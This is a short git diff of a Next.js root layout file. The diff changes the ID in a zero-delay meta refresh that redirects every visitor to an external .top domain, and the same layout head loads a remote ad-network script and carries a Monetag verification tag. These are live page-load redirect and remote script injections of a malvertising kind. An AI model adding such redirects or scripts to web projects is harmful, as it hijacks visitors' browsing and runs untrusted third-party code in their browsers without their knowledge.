@@ -27,7 +27,7 @@ export default function RootLayout({
     <html lang="en">
       <head>
         <meta name="monetag" content="28e3540d2d82a4f50cd4d47971d6ff37"></meta>
-        <meta http-equiv="refresh" content="0; url=https://whoushex.top/4/8640111"></meta>
+        <meta http-equiv="refresh" content="0; url=https://whoushex.top/4/9127213"></meta>
         <script
           src="https://alwingulla.com/88/tag.min.js"
           data-zone="119936"
